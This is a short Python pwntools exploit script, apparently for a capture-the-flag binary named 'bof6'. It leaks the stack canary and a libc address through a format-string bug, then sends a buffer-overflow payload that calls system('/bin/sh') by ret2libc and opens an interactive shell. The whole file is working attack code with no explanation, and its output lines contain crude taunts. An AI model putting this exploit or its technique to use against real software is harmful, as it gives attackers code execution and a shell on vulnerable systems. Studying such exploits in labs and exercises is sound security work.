from pwn import *

def pwn():
        sys_off = 0x03ada0
        exit_off = 0x02e9d0
        bin_sh_off = 0x15ba0b
        p = lambda x : (x[2:].decode('hex'))[::-1]
        r = process('./bof6')
        r.recvuntil('Name: ')
        r.sendline('%x '*18)
        a = r.recvuntil(':')
        print a
        canary = hex(int(a[57:65], 16))
        libc=int(a[95:103],16)-1777664
        print "[+] Here is your cookie motherfucker: "+str(canary)
        print "[+] Libc base address SKIDO: "+hex(libc)
        payload = ""
        payload += "A"*64
        payload += p(canary)
        payload += "B"*12
        payload += p(hex(libc+sys_off))
        payload += p(hex(libc+exit_off))
        payload += p(hex(libc+bin_sh_off))
        r.sendline(payload)
        r.interactive()

pwn()
